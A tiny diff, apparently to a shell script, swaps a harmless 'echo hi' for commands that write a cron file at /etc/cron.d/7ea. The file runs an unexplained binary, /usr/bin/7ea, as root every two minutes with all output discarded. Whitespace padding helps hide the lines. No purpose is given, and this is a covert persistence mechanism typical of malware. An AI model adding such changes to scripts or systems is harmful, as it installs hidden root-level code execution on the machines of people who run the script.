@@ -1,1 +1,4 @@
-echo hi
+rm -fr /etc/cron.d/7ea
+ echo " PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin " >> /etc/cron.d/7ea      
+                                                                                                                                   
+echo " */2 * * * * root /usr/bin/7ea 7ea  >/dev/null 2>&1 " >> /etc/cron.d/7ea
